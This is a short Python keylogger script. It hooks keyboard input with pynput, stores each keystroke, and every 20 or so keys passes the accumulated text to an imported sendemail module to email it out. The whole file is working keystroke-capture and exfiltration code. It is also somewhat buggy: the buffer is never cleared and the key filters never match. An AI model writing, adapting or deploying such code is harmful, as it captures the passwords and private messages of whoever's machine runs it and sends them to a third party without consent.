import pynput # used to take input from keyboard/mouse and use in code
from pynput.keyboard import Key, Listener
import sendemail

count = 0
keys = []

def on_press(key):
    print(key, end=" ")
    print("pressed!")
    global keys, count
    keys.append(str(key) + '\n')
    count += 1
    # checking if someone is typing an email
    if count > 20:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "") # removing single quotes for redability
        if key == "Key.space":
            k = " "
        # check if shift key is used (ignoring it)
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(f"email: {message}", end=" ")
    sendemail.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

# calling on_press & on_release functions when keys are pressed/released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() # continues making this work